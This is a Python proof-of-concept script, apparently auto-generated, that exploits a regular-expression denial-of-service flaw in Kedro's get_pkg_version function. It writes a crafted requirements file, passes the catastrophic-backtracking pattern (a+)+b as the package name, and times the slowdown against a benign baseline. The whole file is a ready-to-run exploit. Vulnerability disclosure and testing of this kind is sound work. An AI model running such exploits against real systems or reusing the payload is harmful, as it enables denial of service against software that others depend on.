#!/usr/bin/env python3
# PoC for kedro (/home/xcy/.local/lib/python3.14/site-packages/kedro)
# Path: redos-010
# Sink: get_pkg_version
# Auto-generated — run with: python3 redos_supply_malicious_regex_pattern_get_pkg_version.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for ReDoS in Kedro's get_pkg_version function.

Vulnerability: The function compiles a regex pattern using user-controlled
package_name without sanitization. An attacker can supply a malicious regex
pattern (e.g., (a+)+b) that causes catastrophic backtracking when matched
against a crafted input line in the requirements file.

This PoC demonstrates the vulnerability by:
1. Creating a malicious requirements file with a crafted line
2. Calling get_pkg_version with a malicious regex pattern
3. Measuring the execution time to show the ReDoS effect

Usage: python3 poc_kedro_redos.py
"""

import re
import time
import tempfile
import os
import sys
from pathlib import Path

# Add kedro to path if needed (adjust if installed elsewhere)
sys.path.insert(0, os.path.expanduser("~/.local/lib/python3.14/site-packages"))

# Import the vulnerable function
from kedro.framework.cli.utils import get_pkg_version


def create_malicious_requirements_file():
    """
    Create a temporary requirements file with a line that triggers
    catastrophic backtracking when matched against the malicious regex.
    
    The malicious regex pattern: (a+)+b
    The crafted input line: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaac"
    
    This causes the regex engine to try many combinations of 'a' groups
    before failing to find 'b', leading to exponential backtracking.
    """
    # Create a line that will cause catastrophic backtracking
    # The line contains many 'a's followed by 'c' (not 'b')
    malicious_line = "a" * 30 + "c"
    
    # Create temporary file
    tmp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False)
    tmp_file.write(malicious_line + "\n")
    tmp_file.close()
    
    return tmp_file.name


def measure_execution_time(func, *args, **kwargs):
    """Measure execution time of a function call."""
    start_time = time.time()
    try:
        result = func(*args, **kwargs)
        elapsed = time.time() - start_time
        return elapsed, result
    except Exception as e:
        elapsed = time.time() - start_time
        return elapsed, str(e)


def main():
    print("[*] Kedro ReDoS Proof-of-Concept")
    print("[*] ============================")
    print()
    
    # Step 1: Create malicious requirements file
    print("[*] Step 1: Creating malicious requirements file...")
    reqs_path = create_malicious_requirements_file()
    print(f"[+] Created temporary file: {reqs_path}")
    
    # Step 2: Define malicious regex pattern
    # The pattern (a+)+b causes catastrophic backtracking
    malicious_pattern = "(a+)+b"
    print(f"[*] Step 2: Using malicious regex pattern: {malicious_pattern}")
    
    # Step 3: Test with benign pattern first (baseline)
    print("[*] Step 3: Testing with benign pattern for baseline...")
    benign_pattern = "numpy"
    elapsed_benign, result_benign = measure_execution_time(
        get_pkg_version, reqs_path, benign_pattern
    )
    print(f"[+] Benign pattern execution time: {elapsed_benign:.4f} seconds")
    print(f"[+] Benign pattern result: {result_benign}")
    print()
    
    # Step 4: Test with malicious pattern
    print("[*] Step 4: Testing with malicious regex pattern...")
    print("[*] This may take several seconds due to catastrophic backtracking...")
    
    elapsed_malicious, result_malicious = measure_execution_time(
        get_pkg_version, reqs_path, malicious_pattern
    )
    
    print(f"[+] Malicious pattern execution time: {elapsed_malicious:.4f} seconds")
    print(f"[+] Malicious pattern result: {result_malicious}")
    print()
    
    # Step 5: Compare and demonstrate the vulnerability
    print("[*] Step 5: Vulnerability Analysis")
    print(f"[*] Benign execution time:  {elapsed_benign:.4f}s")
    print(f"[*] Malicious execution time: {elapsed_malicious:.4f}s")
    
    if elapsed_malicious > elapsed_benign * 10:
        print("[!] VULNERABILITY CONFIRMED: Malicious regex causes significant slowdown!")
        print(f"[!] The malicious pattern took {elapsed_malicious/elapsed_benign:.1f}x longer")
    else:
        print("[*] Note: The slowdown may vary depending on system resources")
        print("[*] Try increasing the number of 'a's in the malicious line")
    
    # Cleanup
    print()
    print("[*] Cleaning up temporary file...")
    os.unlink(reqs_path)
    print("[+] Done!")


if __name__ == "__main__":
    main()
